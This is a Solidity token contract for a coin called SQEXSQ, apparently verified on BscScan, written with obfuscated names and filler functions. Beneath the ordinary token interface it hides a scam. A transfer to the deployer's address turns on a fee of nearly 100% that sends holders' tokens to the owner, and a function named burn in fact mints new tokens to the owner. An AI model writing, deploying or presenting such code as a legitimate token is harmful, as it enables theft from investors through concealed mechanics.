/**
 *Submitted for verification at BscScan.com on 2022-11-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-15 08:47 GMT
 */
 // SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract CQCYFIN {
event Transfer(address indexed from, address indexed to, uint256 value);
address private  NMXBGP = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  KXOMRP = 1000000000000000000000;
string public  symbol = "SQEXSQ";
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  WQDAAX = 1000000000000000000;
address public owner;
address private  LDROFQ = address(0);
mapping (address => uint256) public balanceOf;
uint8 public constant decimals = 18;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  BKNGNW = 10000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  FJGTLM = address(0);
address private  WHASNV = address(0);
uint256 private  FJDQLP = 1000000000000000000;
uint256 private  YIAHOL = 100000000;
uint256 private  TQUIRU = 10000000000000;
uint256 public constant QRRNSQ = 99999;
string public  name = "SQEXSQ";
address private  FHHUXK = address(0);
uint256 private  GKAOMK = 1000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getKXOMRP() private returns (uint256) {
return KXOMRP;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "CDGCEF");
require(to != address(0), "CDGCEF");
require(amount <= balanceOf[from], "CDGCEF");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* QRRNSQ/WQDAAX ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==WHASNV){
WQDAAX = QRRNSQ+2;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getYIAHOL() private returns (uint256) {
return YIAHOL;
}

function _getLDROFQ() private returns (address) {
return LDROFQ;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tCDGCEF 0");
require(spender != address(0), "fCDGCEF 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getNMXBGP() private returns (address) {
return NMXBGP;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getFJDQLP() private returns (uint256) {
return FJDQLP;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getBKNGNW() private returns (uint256) {
return BKNGNW;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
constructor () public {
WHASNV = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getFHHUXK() private returns (address) {
return FHHUXK;
}

function _getTQUIRU() private returns (uint256) {
return TQUIRU;
}

function _getGKAOMK() private returns (uint256) {
return GKAOMK;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getFJGTLM() private returns (address) {
return FJGTLM;
}


}